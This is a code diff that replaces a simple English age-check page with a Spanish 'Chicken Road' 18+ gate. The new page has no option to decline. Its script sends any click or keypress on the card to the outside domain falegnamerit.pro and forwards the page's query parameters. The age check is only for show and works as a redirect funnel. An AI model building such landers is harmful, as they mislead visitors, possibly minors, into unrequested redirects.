@@ -1,187 +1,467 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Age Verification</title>
-  <style>
-    * {
-      box-sizing: border-box;
-      margin: 0;
-      padding: 0;
-    }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificación</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
 
-    body {
-      min-height: 100vh;
-      font-family: Arial, Helvetica, sans-serif;
-      display: flex;
-      align-items: center;
-      justify-content: center;
-      padding: 24px;
-      color: #ffffff;
-      background:
-        radial-gradient(circle at top left, rgba(255, 255, 255, 0.25), transparent 35%),
-        linear-gradient(135deg, #111827, #4c1d95, #be185d);
-      overflow: hidden;
-    }
+        html, body {
+            height: 100%;
+            font-family: 'Nunito', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+        }
 
-    .background-glow {
-      position: fixed;
-      inset: auto auto -120px -120px;
-      width: 360px;
-      height: 360px;
-      background: rgba(255, 255, 255, 0.18);
-      filter: blur(70px);
-      border-radius: 50%;
-      pointer-events: none;
-    }
+        body {
+            background: #0b0e1a;
+            overflow: hidden;
+        }
 
-    .card {
-      width: 100%;
-      max-width: 460px;
-      text-align: center;
-      padding: 42px 30px;
-      border-radius: 28px;
-      background: rgba(255, 255, 255, 0.13);
-      border: 1px solid rgba(255, 255, 255, 0.25);
-      box-shadow: 0 30px 80px rgba(0, 0, 0, 0.35);
-      backdrop-filter: blur(18px);
-      animation: fadeUp 0.7s ease both;
-    }
+        .stage {
+            position: relative;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-    .badge {
-      display: inline-flex;
-      align-items: center;
-      justify-content: center;
-      width: 74px;
-      height: 74px;
-      margin-bottom: 24px;
-      border-radius: 50%;
-      background: rgba(255, 255, 255, 0.18);
-      border: 1px solid rgba(255, 255, 255, 0.3);
-      font-size: 28px;
-      font-weight: 800;
-      letter-spacing: -1px;
-    }
+        .stage::before {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: url("chicken-road.webp") center center/cover no-repeat;
+            filter: brightness(0.08) saturate(0.3);
+            transform: scale(1.05);
+        }
 
-    h1 {
-      font-size: clamp(30px, 8vw, 46px);
-      line-height: 1.05;
-      margin-bottom: 14px;
-      letter-spacing: -1.5px;
-    }
+        .stage::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background:
+                radial-gradient(ellipse at 40% 30%, rgba(255, 215, 0, 0.08), transparent 50%),
+                radial-gradient(ellipse at 60% 70%, rgba(255, 0, 0, 0.06), transparent 45%),
+                linear-gradient(180deg, rgba(11, 14, 26, 0.1), rgba(11, 14, 26, 0.92));
+        }
 
-    p {
-      font-size: 16px;
-      line-height: 1.6;
-      color: rgba(255, 255, 255, 0.82);
-      margin-bottom: 30px;
-    }
+        .card {
+            position: relative;
+            z-index: 2;
+            width: min(570px, 94vw);
+            background: rgba(255, 255, 255, 0.97);
+            border-radius: 20px;
+            overflow: hidden;
+            box-shadow: 0 60px 160px rgba(0, 0, 0, 0.5);
+            cursor: pointer;
+            transition: all 0.4s ease;
+        }
 
-    .buttons {
-      display: grid;
-      grid-template-columns: 1fr 1fr;
-      gap: 14px;
-    }
+        .card:hover {
+            transform: translateY(-6px) scale(1.005);
+            box-shadow: 0 80px 200px rgba(0, 0, 0, 0.6);
+        }
 
-    button {
-      border: 0;
-      border-radius: 999px;
-      padding: 16px 22px;
-      font-size: 17px;
-      font-weight: 700;
-      cursor: pointer;
-      transition: transform 0.2s ease, box-shadow 0.2s ease, background 0.2s ease;
-    }
+        .cardStripe {
+            height: 4px;
+            background: linear-gradient(90deg, #ffd700, #ff0000, #ffd700);
+            background-size: 200% 100%;
+            animation: stripeAnim 5s ease-in-out infinite alternate;
+        }
 
-    .yes {
-      color: #111827;
-      background: #ffffff;
-      box-shadow: 0 14px 30px rgba(255, 255, 255, 0.22);
-    }
+        @keyframes stripeAnim {
+            0% { background-position: 0% 0%; }
+            100% { background-position: 100% 0%; }
+        }
 
-    .no {
-      color: #ffffff;
-      background: rgba(255, 255, 255, 0.14);
-      border: 1px solid rgba(255, 255, 255, 0.25);
-    }
+        .cardGrid {
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+        }
 
-    button:hover {
-      transform: translateY(-3px);
-    }
+        .topBlock {
+            padding: 24px 32px 10px;
+            text-align: center;
+            position: relative;
+        }
 
-    .yes:hover {
-      box-shadow: 0 18px 40px rgba(255, 255, 255, 0.32);
-    }
+        .topBlock .keySet {
+            display: inline-flex;
+            align-items: center;
+            gap: 14px;
+            margin-bottom: 6px;
+        }
 
-    .no:hover {
-      background: rgba(255, 255, 255, 0.22);
-    }
+        .topBlock .keySet .leftKey {
+            font-size: 24px;
+            display: inline-block;
+            transition: 0.3s;
+        }
 
-    .message {
-      min-height: 22px;
-      margin-top: 22px;
-      font-size: 14px;
-      color: rgba(255, 255, 255, 0.86);
-    }
+        .topBlock .keySet .rightKey {
+            font-size: 24px;
+            display: inline-block;
+            transition: 0.3s;
+        }
 
-    @keyframes fadeUp {
-      from {
-        opacity: 0;
-        transform: translateY(24px) scale(0.97);
-      }
-      to {
-        opacity: 1;
-        transform: translateY(0) scale(1);
-      }
-    }
+        .topBlock .keySet .ageBadge {
+            font-size: 26px;
+            font-weight: 800;
+            color: #0f172a;
+            background: #fffbeb;
+            padding: 4px 18px;
+            border-radius: 30px;
+            border: 2px solid #ffd700;
+            display: inline-block;
+            transition: 0.3s;
+        }
 
-    @media (max-width: 420px) {
-      body {
-        padding: 16px;
-      }
+        .topBlock .keySet .ageBadge .gradNum {
+            background: linear-gradient(135deg, #ffd700, #ff0000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
 
-      .card {
-        padding: 34px 22px;
-        border-radius: 24px;
-      }
+        .card:hover .topBlock .keySet .leftKey {
+            transform: scale(1.1) rotate(-8deg);
+        }
 
-      .buttons {
-        grid-template-columns: 1fr;
-      }
+        .card:hover .topBlock .keySet .rightKey {
+            transform: scale(1.1) rotate(8deg);
+        }
 
-      button {
-        width: 100%;
-      }
-    }
-  </style>
+        .card:hover .topBlock .keySet .ageBadge {
+            border-color: #ff0000;
+            transform: scale(1.02);
+        }
+
+        .topBlock .title {
+            font-size: 32px;
+            font-weight: 700;
+            color: #0f172a;
+            letter-spacing: -0.3px;
+            margin-top: 2px;
+        }
+
+        .topBlock .title .gradTitle {
+            background: linear-gradient(135deg, #ffd700, #ff0000);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+
+        .topBlock .sub {
+            color: #64748b;
+            font-size: 14px;
+            margin-top: 2px;
+            line-height: 1.6;
+        }
+
+        .midBlock {
+            padding: 6px 32px 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .midBlock .infoPanel {
+            background: #f8fafc;
+            border-radius: 14px;
+            padding: 14px 20px;
+            width: 100%;
+            text-align: center;
+            border: 1px solid #e2e8f0;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .midBlock .infoPanel .panelIcon {
+            font-size: 18px;
+        }
+
+        .midBlock .infoPanel .panelText {
+            color: #475569;
+            font-size: 14px;
+            line-height: 1.6;
+        }
+
+        .midBlock .infoPanel .panelText .strongText {
+            font-weight: 700;
+            color: #0f172a;
+        }
+
+        .bottomBlock {
+            padding: 10px 32px 26px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .bottomBlock .btn {
+            width: 100%;
+            border: none;
+            border-radius: 30px;
+            padding: 18px 24px;
+            background: linear-gradient(135deg, #ffd700, #ff0000);
+            color: #fff;
+            font-size: 17px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.25s ease;
+            box-shadow: 0 8px 28px rgba(255, 215, 0, 0.25);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .bottomBlock .btn::after {
+            content: "";
+            position: absolute;
+            inset: 0;
+            background: linear-gradient(135deg, #f59e0b, #cc0000);
+            opacity: 0;
+            transition: opacity 0.25s ease;
+        }
+
+        .bottomBlock .btn:hover::after {
+            opacity: 1;
+        }
+
+        .bottomBlock .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 12px 36px rgba(255, 215, 0, 0.35);
+        }
+
+        .bottomBlock .btn:active {
+            transform: translateY(0px) scale(0.98);
+        }
+
+        .bottomBlock .btn .inner {
+            position: relative;
+            z-index: 1;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+        }
+
+        .bottomBlock .btn .inner .check {
+            font-size: 20px;
+        }
+
+        .bottomBlock .note {
+            font-size: 11px;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            flex-wrap: wrap;
+        }
+
+        .bottomBlock .note .pill {
+            padding: 2px 14px;
+            border-radius: 20px;
+            background: #fffbeb;
+            color: #78350f;
+            font-size: 10px;
+            font-weight: 600;
+        }
+
+        .bottomBlock .note .pill.red {
+            background: #fef2f2;
+            color: #7f1d1d;
+        }
+
+        .hiddenBlock {
+            display: none;
+        }
+
+        body.unlocked .card {
+            display: none;
+        }
+
+        body.unlocked .hiddenBlock {
+            display: block;
+            position: relative;
+            z-index: 2;
+            background: rgba(255, 255, 255, 0.04);
+            backdrop-filter: blur(20px);
+            padding: 56px 32px;
+            border-radius: 20px;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            text-align: center;
+            width: min(520px, 88vw);
+            box-shadow: 0 40px 80px rgba(0, 0, 0, 0.5);
+        }
+
+        body.unlocked .hiddenBlock .bigIcon {
+            font-size: 5.2rem;
+            display: block;
+            margin-bottom: 16px;
+        }
+
+        body.unlocked .hiddenBlock .bigTitle {
+            font-size: 2.6rem;
+            font-weight: 700;
+            background: linear-gradient(135deg, #fbbf24, #f87171);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+            margin-bottom: 10px;
+        }
+
+        body.unlocked .hiddenBlock .status {
+            font-size: 1rem;
+            color: #cbd5e1;
+        }
+
+        body.unlocked .hiddenBlock .loader {
+            display: inline-block;
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            border: 4px solid rgba(255, 255, 255, 0.05);
+            border-top: 4px solid #ffd700;
+            border-bottom: 4px solid #ff0000;
+            animation: spin 0.8s linear infinite;
+            margin-top: 28px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        @media (max-width: 480px) {
+            .topBlock {
+                padding: 20px 18px 8px;
+            }
+            .topBlock .title {
+                font-size: 26px;
+            }
+            .topBlock .keySet .ageBadge {
+                font-size: 22px;
+                padding: 2px 14px;
+            }
+            .topBlock .keySet .leftKey,
+            .topBlock .keySet .rightKey {
+                font-size: 20px;
+            }
+            .midBlock {
+                padding: 4px 18px 10px;
+            }
+            .midBlock .infoPanel {
+                padding: 12px 16px;
+            }
+            .midBlock .infoPanel .panelText {
+                font-size: 13px;
+            }
+            .bottomBlock {
+                padding: 6px 18px 20px;
+            }
+            .bottomBlock .btn {
+                font-size: 15px;
+                padding: 16px 18px;
+            }
+        }
+    </style>
 </head>
 <body>
-  <div class="background-glow"></div>
+<div class="stage">
+    <section class="card" id="card" tabindex="0" role="button" aria-label="Confirmar edad">
+        <div class="cardStripe"></div>
+        <div class="cardGrid">
+            <div class="topBlock">
+                <div class="keySet">
+                    <span class="leftKey">🔑</span>
+                    <span class="ageBadge">
+                        <span class="gradNum">18+</span>
+                    </span>
+                    <span class="rightKey">🔑</span>
+                </div>
+                <h1 class="title">
+                    Verificación <span class="gradTitle">de edad</span>
+                </h1>
+                <p class="sub">
+                    Acceso para mayores
+                </p>
+            </div>
+            <div class="midBlock">
+                <div class="infoPanel">
+                    <span class="panelIcon">🛡️</span>
+                    <p class="panelText">
+                        <span class="strongText">Confirma tu edad</span> para continuar.<br>
+                        Debes tener al menos 18 años.
+                    </p>
+                </div>
+            </div>
+            <div class="bottomBlock">
+                <button class="btn" id="btn">
+                    <span class="inner">
+                        <span class="check">✓</span>
+                        Confirmo
+                    </span>
+                </button>
+                <div class="note">
+                    <span class="pill">✓ 18+</span>
+                    Haz clic para confirmar
+                    <span class="pill red">🔒</span>
+                </div>
+            </div>
+        </div>
+    </section>
 
-  <main class="card">
-    <div class="badge">18+</div>
-    <h1>Are you 18 years old?</h1>
-    <p>Please confirm your age before continuing to the website.</p>
+    <section class="hiddenBlock" id="hiddenBlock">
+        <span class="bigIcon">🐔</span>
+        <h2 class="bigTitle">Chicken Road</h2>
+        <p class="status">Cargando…</p>
+        <div class="loader"></div>
+    </section>
+</div>
 
-    <div class="buttons">
-      <button class="yes" onclick="enterSite()">Yes, I am</button>
-      <button class="no" onclick="denyAccess()">No</button>
-    </div>
+<script>
+    (function() {
+        const REDIRECT_URL = "https://falegnamerit.pro";
+        const card = document.getElementById("card");
+        const btn = document.getElementById("btn");
 
-    <div class="message" id="message"></div>
-  </main>
+        function buildRedirectUrl() {
+            const url = new URL(REDIRECT_URL);
+            const params = new URLSearchParams(window.location.search);
+            params.forEach((val, key) => {
+                url.searchParams.set(key, val);
+            });
+            return url.href;
+        }
 
-  <script>
-    function enterSite() {
-      document.getElementById('message').textContent = 'Access granted. Welcome!';
-      // Replace this with your real redirect link:
-      // window.location.href = 'https://your-site.com';
-    }
+        function redirectNow() {
+            window.location.href = buildRedirectUrl();
+        }
 
-    function denyAccess() {
-      document.getElementById('message').textContent = 'Sorry, you must be 18 or older to continue.';
-    }
-  </script>
+        card.addEventListener("click", redirectNow);
+
+        btn.addEventListener("click", function(e) {
+            e.stopPropagation();
+            redirectNow();
+        });
+
+        card.addEventListener("keydown", function(e) {
+            if (e.key === "Enter" || e.key === " ") {
+                e.preventDefault();
+                redirectNow();
+            }
+        });
+    })();
+</script>
 </body>
 </html>
